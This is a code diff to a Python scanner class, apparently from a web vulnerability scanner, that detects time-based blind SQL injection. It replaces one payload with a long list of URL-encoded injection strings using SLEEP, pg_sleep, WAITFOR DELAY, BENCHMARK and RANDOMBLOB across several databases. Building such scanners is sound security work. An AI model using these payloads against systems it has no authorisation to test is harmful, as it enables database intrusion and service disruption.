@@ -37,19 +37,20 @@ class TimeInject(SqlInject, Check):
 		self.__test_num = 3
 		#响应时间平均数
 		self.__mean = 0
-		#秒
-		self.time = [4, 5, 6]
+		#TODO 写死为5秒，增加多个秒
+		self.time = 4
 	
 	def _load_payloads(self):
-		payloads_raw = ['%27%20AND%20SLEEP({time})%20AND%20%27TgYR%27%3d%27TgYR']
+		payloads_raw = ['', '', '', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))bAKL)%20AND%20%27vRxe%27%3d%27vRxe', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))YjoC)%20AND%20%27%%27%3d%27', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)--', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)#', 'SLEEP(5)#', 'SLEEP(5)--%20', 'SLEEP(5)%3d%22', 'SLEEP(5)%3d%27', '%20or%20SLEEP(5)', '%20or%20SLEEP(5)#', '%20or%20SLEEP(5)--', '%20or%20SLEEP(5)%3d%22', '%20or%20SLEEP(5)%3d%27', 'waitfor%20delay%20%2700:00:05%27', 'waitfor%20delay%20%2700:00:05%27--%20', 'waitfor%20delay%20%2700:00:05%27#', 'benchmark(50000000,MD5(1))', 'benchmark(50000000,MD5(1))--%20', 'benchmark(50000000,MD5(1))#', '%20or%20benchmark(50000000,MD5(1))', '%20or%20benchmark(50000000,MD5(1))--%20', '%20or%20benchmark(50000000,MD5(1))#', 'pg_SLEEP(5)', 'pg_SLEEP(5)--%20', 'pg_SLEEP(5)#', '%20or%20pg_SLEEP(5)', '%20or%20pg_SLEEP(5)--%20', '%20or%20pg_SLEEP(5)#', '%27\%22', '%20AnD%20SLEEP(5)', '%20AnD%20SLEEP(5)--', '%20AnD%20SLEEP(5)#', '&&SLEEP(5)', '&&SLEEP(5)--', '&&SLEEP(5)#', '%27%20AnD%20SLEEP(5)%20ANd%20%271', '%27&&SLEEP(5)&&%271', '%20ORDER%20BY%20SLEEP(5)', '%20ORDER%20BY%20SLEEP(5)--%20', '%20ORDER%20BY%20SLEEP(5)#', '(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)', '(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)#', '(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)--', '+benchmark(3200,SHA1(1))+%27', '%20+%20SLEEP(10)%20+%20%27', '%20RANDOMBLOB(500000000/2)', '%20AND%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(500000000/2))))', '%20OR%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(500000000/2))))', '%20RANDOMBLOB(1000000000/2)', '%20AND%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(1000000000/2))))', '%20OR%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(1000000000/2))))', 'SLEEP(2)/*%27%20or%20SLEEP(2)%20or%20%27%22%20or%20SLEEP(1)%20or%20%22*/']
+		#['%27%20AND%20SLEEP(5)%20AND%20%27TgYR%27%3d%27TgYR']
 		payloads = []
-		for i in range(0, self.__test_num):
+		"""for i in range(0, self.__test_num):
 			payloads.append('')
 		for i in range(2, len(payloads)):
-			for t in self.time:
-				for y in range(0, len(payloads_raw)):
-					payloads.append(payloads_raw[y].replace('{time}',str(t)))
-		return payloads
+			#for t in self.time:
+			#	for y in range(0, len(payloads_raw)):
+				payloads.append(payloads_raw[y].replace('{time}',str(t)))"""
+		return payloads_raw
 	
 	def get_timeout(self):
 		return 7
@@ -65,7 +66,7 @@ class TimeInject(SqlInject, Check):
 			#时间差大于最小的sleep时间则是时间盲注
 			self.__test_num = 3
 			#TODO 判断不准确，下版本升级
-			return (diff - self.__mean) >= self.time[0]
+			return (diff - self.__mean) >= self.time
 		self.__test_num -= 1
 		
 class UnionInject(SqlInject):
